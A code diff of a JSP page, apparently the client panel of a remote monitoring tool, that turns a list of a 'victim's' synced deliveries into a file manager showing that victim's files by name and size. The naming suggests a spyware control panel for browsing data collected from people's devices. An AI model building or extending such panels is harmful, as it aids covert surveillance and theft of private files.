@@ -1,11 +1,10 @@
-<%@ page import="com.theah64.xrob.api.database.tables.Deliveries" %>
-<%@ page import="com.theah64.xrob.api.database.tables.Victims" %>
 <%@ page import="com.theah64.xrob.api.models.Delivery" %>
 <%@ page import="com.theah64.xrob.api.models.Victim" %>
 <%@ page import="com.theah64.xrob.api.utils.clientpanel.PathInfo" %>
 <%@ page import="java.util.List" %>
 <%@ page import="com.theah64.xrob.api.utils.clientpanel.HtmlTemplates" %>
-<%@ page import="com.theah64.xrob.api.database.tables.ClientVictimRelations" %>
+<%@ page import="com.theah64.xrob.api.database.tables.*" %>
+<%@ page import="com.theah64.xrob.api.models.File" %>
 <%--
   Created by IntelliJ IDEA.
   User: theapache64
@@ -42,8 +41,10 @@
     <%
         try {
 
-            final PathInfo pathInfoUtils = new PathInfo(request.getPathInfo(), 1, 1);
+            final PathInfo pathInfoUtils = new PathInfo(request.getPathInfo(), 1, 2);
             final String victimCode = pathInfoUtils.getPart(1);
+            String fileParentId = pathInfoUtils.getPart(2, "0");
+
             final Victims victimsTable = Victims.getInstance();
             final Victim theVictim = victimsTable.get(Victims.COLUMN_VICTIM_CODE, victimCode);
 
@@ -60,7 +61,7 @@
             <li><a href="/client/panel">Victims</a></li>
             <li><a href="/client/victim/profile/<%=victimCode%>"><%=theVictim.getIdentity()%>
             </a></li>
-            <li class="active">Files</li>
+            <li class="active">File manager</li>
         </ul>
     </div>
 
@@ -69,8 +70,8 @@
         <div class="row" style="margin-top: 20px;">
 
             <%
-                final List<Delivery> deliveries = Deliveries.getInstance().getAll(theVictim.getId());
-                if (deliveries != null) {
+                final List<File> files = Files.getInstance().getAll(theVictim.getId(), fileParentId);
+                if (files != null) {
             %>
             <div class="col-md-10 content-centered">
 
@@ -80,20 +81,17 @@
 
                 <table id="tDeliveries" class="table table-bordered table-condensed">
                     <tr>
-                        <th>Type</th>
-                        <th>Message</th>
-                        <th>Synced</th>
+                        <th>File name</th>
+                        <th>Size</th>
                     </tr>
 
                     <%
-                        for (final Delivery delivery : deliveries) {
+                        for (final File file : files) {
                     %>
                     <tr class="delivery_row">
-                        <td><%=delivery.getDataType()%>
+                        <td><%=file.getFileName()%>
                         </td>
-                        <td><%=delivery.getMessage()%>
-                        </td>
-                        <td><%=delivery.getRelativeSyncTime()%>
+                        <td><%=file.getFileSizeInKB()%>
                         </td>
                     </tr>
                     <%
@@ -104,7 +102,7 @@
             </div>
             <%
                 } else {
-                    throw new PathInfo.PathInfoException("No delivery found!");
+                    throw new PathInfo.PathInfoException("No files found!");
                 }
             %>
 
